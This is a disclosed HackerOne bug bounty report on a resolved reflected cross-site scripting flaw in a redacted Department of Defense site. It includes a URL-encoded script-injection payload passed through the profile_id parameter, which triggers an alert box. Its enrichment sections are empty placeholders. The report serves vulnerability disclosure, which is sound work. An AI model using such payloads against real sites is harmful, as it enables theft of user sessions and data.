---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1103033'
original_report_id: '1103033'
title: Reflected XSS on https://█████
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-02-14T02:53:07.218Z'
disclosed_at: '2021-03-11T20:52:12.645Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://█████

## Metadata

- HackerOne Report ID: 1103033
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-03-11T20:52:12.645Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

#Summary:

Reflected xss can use to steal user information because it is coming from trusted website.
an user can easily trust it and attacker can easily steal user information

#Steps To Reproduce:

  1.  go to https://████?profile_id=%22%3E%3C/script%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E

2.    you will able to see xss


#Supporting Material/References:

screenshot

Thank you
@ibring
Impact

## Impact

attacker can steal user information via xss

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
#Steps To Reproduce:

  1.  go to https://█████████?profile_id=%22%3E%3C/script%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E

2.    you will able to see xss

## Suggested Mitigation/Remediation Actions
validate user input don't allow execute special character in source code

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
